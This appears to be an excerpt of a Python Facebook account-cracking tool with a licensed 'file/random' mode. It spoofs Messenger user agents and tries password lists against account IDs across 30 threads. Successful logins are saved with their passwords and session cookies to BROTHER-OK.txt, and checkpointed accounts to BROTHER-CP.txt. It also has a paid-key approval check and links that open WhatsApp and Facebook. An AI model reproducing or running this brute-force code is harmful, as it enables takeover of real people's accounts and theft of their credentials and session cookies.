...
def limon1():
        ua = f'Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/'+str(random.randint(111,999))+'.0.0.15.'+str(random.randint(11,99))+';FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/'+str(random.randint(11111111,99999999))+';FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]' 
        return ua
#-----------------------------------------------------#
os.system('xdg-open https://m.me/j/AbaeoDGTavNQds63/ ')
logo1 = f"""{W}
\033[38;5;196m──────────────────────────────────────────────────
\033[1;92m \x1b[38;5;46m██████╗ ██████╗  ██████╗ ████████╗██╗  ██╗███████╗██████╗\033[1;91m    
\033[1;92m \x1b[38;5;47m██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗\033[1;91m   
\033[1;92m \x1b[38;5;48m██████╔╝██████╔╝██║   ██║   ██║   ███████║█████╗  ██████╔╝ \033[1;91m  
\033[1;92m \x1b[38;5;49m██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗\033[1;91m  
\033[1;92m \x1b[38;5;50m██████╔╝██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║\033[1;91m  
\033[1;92m \x1b[38;5;51m╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\033[1;91m
\033[38;5;196m──────────────────────────────────────────────────
\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
 [<>] \033[1;36mOWNER   :  PRINC LIMON
 [<>] \033[1;32mOWNER   :  PRINC SOHAN
 [<>] \033[1;34mGITHUB  :  MOTHER-FUCKER
 [<>] \033[1;35mSTATUS  :  TRYL
 [<>] \033[1;31mTOOLS   :  FILE X RANDOM
 [<>] \033[1;37mVERSION :  \033[1;32m 0.1\033[1;32m \033[1;37m
\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
\033[1;32m═══════════════════════════════════════════════
 LICENSE  : {MY_KEY}
\033[1;32m═══════════════════════════════════════════════"""
...
class apvroval:
    def check():
        url = "https://github.com/MATHEE-FAKER/NEW-PAID-TRIAL/blob/main/Approval.txt"
        import mechanize
        ...
        try:
            ...
            if MY_KEY in check_key:
                ...
                os.system('xdg-open https://wa.me/+8801754823797 ')
...
class Main:
    def Awm():
        ...
        print(f' [3]<>FOLLOW FACEBOOK')
        print(f' [4]<>EXIT PROGRAM')
        linex()
        awm = input(f' ~SELECT OPTION :{G} ');linex()
        if awm in ['1']:Awm_File()
        elif awm in ['2']:Awm_rndm()
        elif awm in ['3']:os.system('xdg-open https://www.facebook.com/profile.php?id=100056640142234')
...
def Awm_File():
    ...
    with tred(max_workers=30) as My_Tanisha:
        ...
        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/BROTHER-OK.txt{W}")
        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/BROTHER-CP.txt{W}")
    ...
    try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[BROTHER-OK] {ids} | {pas}')
                open('/sdcard/BROTHER-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/BROTHER-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    ...
    try:
        for pas in passlist:
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[BROTHER-OK] {uid} | {pas}')
                open('/sdcard/BROTHER-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
